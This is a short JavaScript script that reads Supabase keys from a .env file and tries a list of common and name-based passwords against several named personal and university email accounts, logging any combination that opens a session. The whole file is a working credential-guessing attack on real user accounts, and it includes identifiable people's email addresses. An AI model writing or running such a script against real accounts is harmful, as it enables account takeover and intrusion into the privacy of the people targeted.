import { createClient } from '@supabase/supabase-js';
import fs from 'node:fs';

const envContent = fs.readFileSync('.env', 'utf8');
const env = {};
for (const line of envContent.split('\n')) {
  const match = line.match(/^([^=]+)=(.*)$/);
  if (match) env[match[1].trim()] = match[2].trim().replace(/^["']|["']$/g, '');
}

const supabase = createClient(env.SUPABASE_URL, env.SUPABASE_PUBLISHABLE_KEY);

const emails = ['shindesmit314@gmail.com', 'arpan.baidya@ustu.edu.in', 'smit2shinde2@gmail.com', 'amit@gmail.com'];
const commonPasswords = ['123456', '12345678', 'password', 'Password123', 'Password@123', 'admin123', 'kryptedu', 'shinde', 'arpan123', 'arpan@123', 'smit123', 'smit@123'];

async function check() {
  for (const email of emails) {
    for (const p of commonPasswords) {
      const { data, error } = await supabase.auth.signInWithPassword({ email, password: p });
      if (data?.session) {
        console.log(`FOUND CREDENTIALS: ${email} -> ${p}`);
        return;
      }
    }
  }
  console.log('No common passwords matched.');
}

check().catch(console.error);
